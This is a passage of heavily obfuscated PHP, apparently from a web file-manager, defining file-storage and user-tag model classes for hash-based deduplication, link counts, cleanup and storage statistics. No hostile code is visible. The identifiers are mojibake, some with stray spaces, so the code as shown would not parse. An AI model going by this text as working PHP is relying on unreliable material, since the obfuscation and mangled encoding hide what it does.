= $ë²®Ã•[$êÛË·¶‚[412]]; } $½¹ÁªŞğ[$½Œ±ëÎ] = $‚ÑÒÂß; } return $½¹ÁªŞğ ? $½¹ÁªŞğ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\146\x69\154\145\137\x63\157\x6e\x74\145\156\x74\x73"; protected $dataAuto = array(array("\143\x72\145\141\x74\145\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\151\x6e\163\145\162\x74", "\x66\165\x6e\143\x74\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\146\151\x6c\145"; protected $tableMeta = array("\x74\x61\x62\154\145\116\141\155\145" => "\x69\x6f\x5f\146\x69\154\145\x5f\x6d\145\164\141", "\x6d\x65\x74\141\x46\x69\145\154\x64" => "\x66\x69\x6c\145\x49\x44"); public function fileInfo($•è§ôÙÏ) { $‚È“§Á† =& $_SERVER[¹òÍ›æş]; static $Ç¢şöåà = array(); if (!isset($Ç¢şöåà[$•è§ôÙÏ])) { $›Ç´ÉÆ‰ = $‚È“§Á†[1908]; $à®‹öœ = Model($‚È“§Á†[509])->field($›Ç´ÉÆ‰)->where(array($‚È“§Á†[507] => $•è§ôÙÏ))->find(); $Ç¢şöåà[$•è§ôÙÏ] = $à®‹öœ; } return $Ç¢şöåà[$•è§ôÙÏ]; } public function addFileByContent($ïüå²ú = '', $÷õ¶˜Ì­ = '') { $³æìÔ‚ï =& $_SERVER[¹òÍ›æş]; $òøÄ“áê = TEMP_PATH . $³æìÔ‚ï[1909]; if (!is_dir($òøÄ“áê)) { mk_dir($òøÄ“áê); } $¿µ±± … = $òøÄ“áê . $³æìÔ‚ï[1910] . rand_string(16); file_put_contents($¿µ±± …, $ïüå²ú); $êĞªèßª = $this->addFile($¿µ±± …, $÷õ¶˜Ì­, !0); if (file_exists($¿µ±± …)) { @unlink($¿µ±± …); } return $êĞªèßª; } public function createFileName($‚©µ´Îœ, $Œ—½ÈÓ‚ = false, $ò«°÷¿¦ = false) { $•ñ…×ü™ =& $_SERVER[¹òÍ›æş]; $Â¥¼Ñğ = IO::init($•ñ…×ü™[8]); $½¹ƒ« ª = $this->makeFilePath($‚©µ´Îœ, $Â¥¼Ñğ, $Œ—½ÈÓ‚, $ò«°÷¿¦); $–É³ÆÑï = $Â¥¼Ñğ->pathFather($½¹ƒ« ª); static $ÍÛ°öé = false; $—Ä¹‹…â = $•ñ…×ü™[1911] . md5($–É³ÆÑï); if (!$ÍÛ°öé && !Cache::get($—Ä¹‹…â)) { $ÍÛ°öé = !0; $Œ¿“°ĞÃ = IO::mkdir($–É³ÆÑï); if (!IO::exist($Œ¿“°ĞÃ . $•ñ…×ü™[827])) { IO::mkfile($Œ¿“°ĞÃ . $•ñ…×ü™[827]); } Cache::set($—Ä¹‹…â, 1, 3600 * 2); } return $½¹ƒ« ª; } public function makeFilePath($Â‰£ÔñÑ, $½¶ª“÷€, $™ºÊ¨Ğ = false, $Èµ×—Ø = false) { $„ğñâ Ó =& $_SERVER[¹òÍ›æş]; $œæÏâ¯ = Model($„ğñâ Ó[800])->get($„ğñâ Ó[1912]); $±™İø— = KodIO::defaultIO() . date($„ğñâ Ó[1913]); $´“Ãú = $±™İø— . rand_string(5) . short_id(100); $Â‰£ÔñÑ = str_replace($„ğñâ Ó[8], $„ğñâ Ó[11], KodIO::clear($Â‰£ÔñÑ)); $œí“’ğÄ = $½¶ª“÷€->ext($Â‰£ÔñÑ); if (!$Â‰£ÔñÑ) { $œæÏâ¯ = $„ğñâ Ó[1914]; } switch ($œæÏâ¯) { case $„ğñâ Ó[1915]: $´“Ãú = $´“Ãú . $„ğñâ Ó[10] . $½¶ª“÷€->ext($Â‰£ÔñÑ); if ($œí“’ğÄ == $„ğñâ Ó[1852]) { $´“Ãú .= $„ğñâ Ó[1233]; } break; case $„ğñâ Ó[1916]: $«Êç¸™¤ = Model($„ğñâ Ó[800])->get($„ğñâ Ó[801]); $ãÏØéÒº = substr(md5($„ğñâ Ó[802] . $«Êç¸™¤ . date($„ğñâ Ó[778])), 0, 8); $ã¬º”ò» = KodIO::defaultDriver(); $±™İø— = $„ğñâ Ó[1264] . $ã¬º”ò»[$„ğñâ Ó[437]] . $„ğñâ Ó[447] . date($„ğñâ Ó[1917]) . $ãÏØéÒº . $„ğñâ Ó[8]; if ($œí“’ğÄ == $„ğñâ Ó[1852]) { $Â‰£ÔñÑ .= $„ğñâ Ó[1233]; } $Á©Îâœ = $„ğñâ Ó[1918] . $±™İø— . $Â‰£ÔñÑ; CacheLock::lock($Á©Îâœ); $´“Ãú = $±™İø— . $Â‰£ÔñÑ; if (IO::exist($±™İø— . $Â‰£ÔñÑ)) { $ ßÍá’ = substr($Â‰£ÔñÑ, 0, strlen($Â‰£ÔñÑ) - strlen($œí“’ğÄ)); $ïÓïéÍ = $Èµ×—Ø ? substr($Èµ×—Ø, 0, 5) : ($™ºÊ¨Ğ ? substr($™ºÊ¨Ğ, 0, 5) : rand_string(5)); $´“Ãú = $±™İø— . $ ßÍá’ . $ïÓïéÍ . $„ğñâ Ó[10] . $œí“’ğÄ; } if (IO::isTypeObject($´“Ãú) && !IO::isUploadServer($´“Ãú)) { if (IO::exist($´“Ãú)) { return $´“Ãú; } $¶ğğÆµ¼ = IO::setContent($´“Ãú, $„ğñâ Ó[12]); if (!$¶ğğÆµ¼) { show_json($„ğñâ Ó[1919], !1); } } CacheLock::unlock($Á©Îâœ); break; case $„ğñâ Ó[1914]: break; default: break; } return $´“Ãú; } public function addFileByRemote($÷Î“»Àâ, $Ğ©ü˜öä, $‡ñóï‰Æ = array()) { $Œş¨ªùÜ =& $_SERVER[¹òÍ›æş]; if (!IO::exist($÷Î“»Àâ)) { return !1; } $ÛÁÀ£ = $‡ñóï‰Æ[$Œş¨ªùÜ[186]] ? $‡ñóï‰Æ[$Œş¨ªùÜ[186]] : $Œş¨ªùÜ[12]; $‰Ñ”ç³Œ = IO::hashMd5($÷Î“»Àâ, $ÛÁÀ£); $¯”“òØ» = KodIO::defaultDriver(); $ª¾öø¶æ = array($Œş¨ªùÜ[583] => IO::size($÷Î“»Àâ), $Œş¨ªùÜ[1920] => 1, $Œş¨ªùÜ[458] => $Ğ©ü˜öä, $Œş¨ªùÜ[838] => $¯”“òØ»[$Œş¨ªùÜ[437]], $Œş¨ªùÜ[459] => $÷Î“»Àâ, $Œş¨ªùÜ[1921] => $‡ñóï‰Æ[$Œş¨ªùÜ[187]] ? $‡ñóï‰Æ[$Œş¨ªùÜ[187]] : IO::hashSimple($÷Î“»Àâ), $Œş¨ªùÜ[1922] => $‰Ñ”ç³Œ ? $‰Ñ”ç³Œ : $ÛÁÀ£); if ($³’•¿¿æ = $this->addFileCheckExist($ª¾öø¶æ[$Œş¨ªùÜ[187]], $ª¾öø¶æ[$Œş¨ªùÜ[186]], $ª¾öø¶æ[$Œş¨ªùÜ[86]])) { return $³’•¿¿æ; } return $this->addFileData($ª¾öø¶æ); } private function addFileData($½ÔÈš‰¤) { $Ğ½²ş½ =& $_SERVER[¹òÍ›æş]; if (!$½ÔÈš‰¤) { return !1; } $½ÔÈš‰¤[$Ğ½²ş½[86]] = intval($½ÔÈš‰¤[$Ğ½²ş½[86]]); if (!$½ÔÈš‰¤[$Ğ½²ş½[86]] && strlen($½ÔÈš‰¤[$Ğ½²ş½[187]]) > 32) { $½ÔÈš‰¤[$Ğ½²ş½[86]] = intval(substr($½ÔÈš‰¤[$Ğ½²ş½[187]], 32)); } $¡„Ş¯Âø = $this->add($½ÔÈš‰¤); return $this->find($¡„Ş¯Âø); } public function addFile($ëæ£»©Ú, $ì»éó…, $‡É§·µĞ = false) { $ûµ’éñ =& $_SERVER[¹òÍ›æş]; $­êœ¯ = IO::hashSimple($ëæ£»©Ú); $æ°»ÓÎ™ = IO::size($ëæ£»©Ú); $Ñ‰Áëùø = $æ°»ÓÎ™ <= 1024 * 1024 * 10 ? IO::hashMd5($ëæ£»©Ú) : $ûµ’éñ[12]; $‘Œ¢±„Û = $ûµ’éñ[1923] . $­êœ¯; CacheLock::lock($‘Œ¢±„Û); if ($Ñ‰Áëùø && $­êœ¯) { $úùõÓ = $this->addFileCheckExist($­êœ¯, $Ñ‰Áëùø, $æ°»ÓÎ™); if ($úùõÓ) { CacheLock::unlock($‘Œ¢±„Û); return $úùõÓ; } } $œŠ¼Àİ = $this->addFileMake($ëæ£»©Ú, $æ°»ÓÎ™, $­êœ¯, $Ñ‰Áëùø, $ì»éó…, $‡É§·µĞ); $ß…ŸíŸå = $this->addFileData($œŠ¼Àİ); CacheLock::unlock($‘Œ¢±„Û); if (!$Ñ‰Áëùø && $ß…ŸíŸå) { $this->fileMd5Check($ß…ŸíŸå); } return $ß…ŸíŸå; } private function fileMd5Check($šªÄÕÆ‚) { $ßÖÜ¥ö‰ =& $_SERVER[¹òÍ›æş]; $í÷…´ = array($šªÄÕÆ‚[$ßÖÜ¥ö‰[506]], $šªÄÕÆ‚[$ßÖÜ¥ö‰[94]]); $àªÚİËÊ = $ßÖÜ¥ö‰[1924] . $šªÄÕÆ‚[$ßÖÜ¥ö‰[94]]; $Ô×ÆŠÃ = $ßÖÜ¥ö‰[1925] . $šªÄÕÆ‚[$ßÖÜ¥ö‰[506]]; $±Ûòáçì = TaskQueue::add($ßÖÜ¥ö‰[1926], $í÷…´, $àªÚİËÊ, $Ô×ÆŠÃ); if (!$±Ûòáçì) { $this->fileMd5Set($šªÄÕÆ‚[$ßÖÜ¥ö‰[506]], $šªÄÕÆ‚[$ßÖÜ¥ö‰[94]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($Ë©ø¡ä°, $çÖÉ†Ì¡) { $™©€˜• =& $_SERVER[¹òÍ›æş]; $éÊ·Ü = $this->find($Ë©ø¡ä°); if (!$éÊ·Ü || $éÊ·Ü[$™©€˜•[186]]) { return; } $¡„¤ÎÏ´ = IO::hashMd5($çÖÉ†Ì¡); if (!$¡„¤ÎÏ´) { return $™©€˜•[12]; } $this->where(array($™©€˜•[506] => $Ë©ø¡ä°))->save(array($™©€˜•[186] => $¡„¤ÎÏ´)); } public function addFileMake($ĞïÑ©—€, $Æ¹Õ¹Ïä, $ßç§Ôó, $Ñùª—ä, $õäÊëš, $áÍ‡é×) { $¾Ş°À–Ã =& $_SERVER[¹òÍ›æş]; $œä©û¬ë = $this->createFileName($õäÊëš, $ßç§Ôó, $Ñùª—ä); $˜ÓĞÅí† = get_path_father($œä©û¬ë); $íİ–³ùò = get_path_this($œä©û¬ë); if ($áÍ‡é×) { $ì›¨üàÚ = IO::move($ĞïÑ©—€, $˜ÓĞÅí†, !1, $íİ–³ùò); } else { $ì›¨üàÚ = IO::copy($ĞïÑ©—€, $˜ÓĞÅí†, !1, $íİ–³ùò); } if (!$ì›¨üàÚ) { return !1; } $…Ç¸×ğ = KodIO::defaultDriver(); $É³Ó“ïŞ = array($¾Ş°À–Ã[583] => $Æ¹Õ¹Ïä, $¾Ş°À–Ã[1920] => 1, $¾Ş°À–Ã[458] => $õäÊëš, $¾Ş°À–Ã[838] => $…Ç¸×ğ[$¾Ş°À–Ã[437]], $¾Ş°À–Ã[459] => $œä©û¬ë, $¾Ş°À–Ã[1921] => $ßç§Ôó, $¾Ş°À–Ã[1922] => $Ñùª—ä); return $É³Ó“ïŞ; } public function addFileCheckExist($æËÍîşÙ, $ÑòìŠÌ, $ïêáÙÔ) { $ˆ¤œÏß =& $_SERVER[¹òÍ›æş]; $‘öÍíÇ = $this->findByHash($æËÍîşÙ, $ÑòìŠÌ); if (!$‘öÍíÇ) { return !1; } $ÆÊÉë»Ì = array($ˆ¤œÏß[1920] => intval($‘öÍíÇ[$ˆ¤œÏß[1927]]) + 1, $ˆ¤œÏß[583] => $ïêáÙÔ); $this->where(array($ˆ¤œÏß[507] => $‘öÍíÇ[$ˆ¤œÏß[506]]))->save($ÆÊÉë»Ì); return $‘öÍíÇ; } public function remove($–è¬Œ¾½) { $this->linkCountChange($–è¬Œ¾½, !1); $this->clearEmpty(); return !0; } public function linkAdd($ÛÛÂ¨ç›) { $this->linkCountChange($ÛÛÂ¨ç›, !0); } public function linkCountChange($ œœ³Øì, $ª’ºàï) { $–ÇşÌãş =& $_SERVER[¹òÍ›æş]; if (!$ œœ³Øì) { return; } if (!is_array($ œœ³Øì)) { $ œœ³Øì = array($ œœ³Øì); } $²®ƒúß = array(); foreach ($ œœ³Øì as $Í•ÈÌÔ°) { $Î¬Ùğ÷‘ = $Í•ÈÌÔ° . $–ÇşÌãş[12]; if (!$²®ƒúß[$Î¬Ùğ÷‘]) { $²®ƒúß[$Î¬Ùğ÷‘] = 0; } $²®ƒúß[$Î¬Ùğ÷‘]++; } $ŞİŒ…ùŠ = array(); foreach ($²®ƒúß as $Í•ÈÌÔ° => $Çñªğš™) { $Î¬Ùğ÷‘ = $Çñªğš™ . $–ÇşÌãş[12]; if (!$ŞİŒ…ùŠ[$Î¬Ùğ÷‘]) { $ŞİŒ…ùŠ[$Î¬Ùğ÷‘] = array(); } $ŞİŒ…ùŠ[$Î¬Ùğ÷‘][] = $Í•ÈÌÔ°; } foreach ($ŞİŒ…ùŠ as $Çñªğš™ => $×˜Œ›ı×) { if (!$×˜Œ›ı×) { continue; } $Çñªğš™ = $ª’ºàï ? $Çñªğš™ : -intval($Çñªğš™); $¦ƒşô‰ = array($–ÇşÌãş[506] => array($–ÇşÌãş[7], $×˜Œ›ı×)); if ($Çñªğš™ < 0) { $¦ƒşô‰[$–ÇşÌãş[1927]] = array($–ÇşÌãş[1042], abs($Çñªğš™)); } $this->where($¦ƒşô‰)->setAdd($–ÇşÌãş[1927], $Çñªğš™); } } public function findByHash($ª¶«çÍà, $—ãÒ™®£ = false) { $±»¦‰ıî =& $_SERVER[¹òÍ›æş]; if (!$ª¶«çÍà && !$—ãÒ™®£) { return !1; } $Éªİœòş = array($±»¦‰ıî[1921] => $ª¶«çÍà); if ($—ãÒ™®£) { $Éªİœòş = array($±»¦‰ıî[1922] => $—ãÒ™®£); } return $this->order($±»¦‰ıî[1928])->where($Éªİœòş)->find(); } public function clearEmpty($€ş„„Œ¸ = 0) { $©ñ™ˆ¿³ =& $_SERVER[¹òÍ›æş]; $ôÄŒì§ó = time() - 3600 * 24 * $€ş„„Œ¸; $ô‹Õã­Ü = $©ñ™ˆ¿³[1929] . $ôÄŒì§ó; $÷—øö¶î = $this->where($ô‹Õã­Ü)->select(); if (!$÷—øö¶î) { return; } $©¤œË¢³ = new Task($©ñ™ˆ¿³[1930], $©ñ™ˆ¿³[12], count($÷—øö¶î)); foreach ($÷—øö¶î as $’Îøé®¡) { $©¤œË¢³->update(1); $this->resetFile($’Îøé®¡); } $©¤œË¢³->end(); } public function resetFile($ Àø……) { $Ê÷ìÂ‡ò =& $_SERVER[¹òÍ›æş]; $¶ê•ğ•İ = array($Ê÷ìÂ‡ò[507] => $ Àø……[$Ê÷ìÂ‡ò[506]]); $¥…½ Ùê = Model($Ê÷ìÂ‡ò[1360])->where($¶ê•ğ•İ)->count(); $Æø·ğè¯ = Model($Ê÷ìÂ‡ò[1931])->where($¶ê•ğ•İ)->count(); $Úí€¡à‹ = intval($¥…½ Ùê) + intval($Æø·ğè¯); if ($Úí€¡à‹ == 0) { IO::remove($ Àø……[$Ê÷ìÂ‡ò[94]]); Model($Ê÷ìÂ‡ò[1932])->delete($ Àø……[$Ê÷ìÂ‡ò[506]]); $this->where($¶ê•ğ•İ)->delete(); $this->metaSet($ Àø……[$Ê÷ìÂ‡ò[506]], null, null); return; } if ($ Àø……[$Ê÷ìÂ‡ò[1927]] != $Úí€¡à‹) { $this->where($¶ê•ğ•İ)->save(array($Ê÷ìÂ‡ò[1920] => $Úí€¡à‹)); } } public function storageInfo($òÅÛ½× = false) { $è‚¬õÌ´ =& $_SERVER[¹òÍ›æş]; $±‘ş·¹† = $this->count() + 0.0; $ÓæÑüƒ = 0; $°œ»œæ© = 1; $¼¿†ñŒ = 0; $ú×¶¥Ëä = 5000; for ($‹„âÃÁ• = 0; $‹„âÃÁ• < $±‘ş·¹†; $‹„âÃÁ• = $‹„âÃÁ• + $ú×¶¥Ëä) { $«İÑšÈÕ = $this->limit($‹„âÃÁ•, $‹„âÃÁ• + $ú×¶¥Ëä)->select(); foreach ($«İÑšÈÕ as $”¼—¸íù) { $°œ»œæ© += $”¼—¸íù[$è‚¬õÌ´[86]] * $”¼—¸íù[$è‚¬õÌ´[1927]]; $ÓæÑüƒ += $”¼—¸íù[$è‚¬õÌ´[86]] * ($”¼—¸íù[$è‚¬õÌ´[1927]] - 1); $¼¿†ñŒ += $”¼—¸íù[$è‚¬õÌ´[1927]]; } } $Ÿó»€é = array($è‚¬õÌ´[1933] => $°œ»œæ©, $è‚¬õÌ´[1934] => $ÓæÑüƒ, $è‚¬õÌ´[1935] => $ÓæÑüƒ / $°œ»œæ©, $è‚¬õÌ´[90] => $±‘ş·¹†, $è‚¬õÌ´[1936] => $¼¿†ñŒ); return $Ÿó»€é; } } goto d ¥Ë‰Ìà; aßÔ×›­‡: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($ş…ïŠ») { $»¬»õå =& $_SERVER[¹òÍ›æş]; return array($»¬»õå[1970] => array($»¬»õå[2354] . USER_ID, $»¬»õå[1971])); } protected function listData() { $ÒÍğ¾• =& $_SERVER[¹òÍ›æş]; $ºÜ»íğà = array($ÒÍğ¾•[1660] => USER_ID, $ÒÍğ¾•[521] => array($ÒÍğ¾•[1974], 0)); $ÉÓæ†²Ó = $ÒÍğ¾•[2355]; $¢ÑÕ™›¿ = $this->field($ÉÓæ†²Ó)->where($ºÜ»íğà)->order($ÒÍğ¾•[1977])->select(); return $¢ÑÕ™›¿ ? $¢ÑÕ™›¿ : array(); } protected function addToTag($‰ä¼ŞÉ, $ËóĞ”ƒ¢) { $œß±´Ë =& $_SERVER[¹òÍ›æş]; if (!Model($œß±´Ë[2119])->listData($ËóĞ”ƒ¢)) { return !1; } if (is_numeric($‰ä¼ŞÉ)) { $×Ü„—¨ï = Model($œß±´Ë[855])->pathInfo($‰ä¼ŞÉ); if (!$×Ü„—¨ï) { return !1; } } else { $×Ü„—¨ï = IO::infoSimple($‰ä¼ŞÉ); if (!$×Ü„—¨ï) { return !1; } $ÒëØÒù™ = $×Ü„—¨ï[$œß±´Ë[32]]; $Û€Œ°¿ = $×Ü„—¨ï[$œß±´Ë[33]]; if (isset($×Ü„—¨ï[$œß±´Ë[448]])) { $Û€Œ°¿ = $×Ü„—¨ï[$œß±´Ë[448]] == $œß±´Ë[98] ? $œß±´Ë[85] : $œß±´Ë[210]; } } $ËÁÂ™êÈ = array($œß±´Ë[1660] => USER_ID, $œß±´Ë[521] => $ËóĞ”ƒ¢, $œß±´Ë[459] => $‰ä¼ŞÉ, $œß±´Ë[460] => $Û€Œ°¿ ? $Û€Œ°¿ : $œß±´Ë[454], $œß±´Ë[458] => $ÒëØÒù™ ? $ÒëØÒù™ : $œß±´Ë[12], $œß±´Ë[1863] => 0); if ($this->where($ËÁÂ™êÈ)->find()) { return !1; } return $this->add($ËÁÂ™êÈ); } protected function removeFromTag($¶œôƒí±, $¥ñÖË¹„) { $©Ñ¢£Â³ =& $_SERVER[¹òÍ›æş]; if (!Model($©Ñ¢£Â³[2119])->listData($¥ñÖË¹„)) { return !1; } if (is_array($¶œôƒí±)) { $¶œôƒí± = array($©Ñ¢£Â³[7], $¶œôƒí±); } $˜ Û¹Ö = array($©Ñ¢£Â³[1660] => USER_ID, $©Ñ¢£Â³[521] => $¥ñÖË¹„, $©Ñ¢£Â³[459] => $¶œôƒí±); return $this->where($˜ Û¹Ö)->delete(); } protected function removeByTag($œ„ê«’) { $ˆÅ˜¸´Ó =& $_SERVER[¹òÍ›æş]; if (!$œ„ê«’) { return !1; } $ĞÀªÇàÔ = array($ˆÅ˜¸´Ó[1660] => USER_ID, $ˆÅ˜¸´Ó[521] => $œ„ê«’); return $this->where($ĞÀªÇàÔ)->delete(); } protected function removeBySource($£Í¦å­Î) { $ğºö¼Á =& $_SERVER[¹òÍ›æş]; if (is_array($£Í¦å­Î)) { $£Í¦å­Î = array($ğºö¼Á[7], $£Í¦å­Î); } $“ú´Ğî = array($ğºö¼Á[1660] => USER_ID, $ğºö¼Á[521] => array($ğºö¼Á[1041], 0), $ğºö¼Á[459] => $£Í¦å­Î); return $this->where($“ú´Ğî)->delete(); } }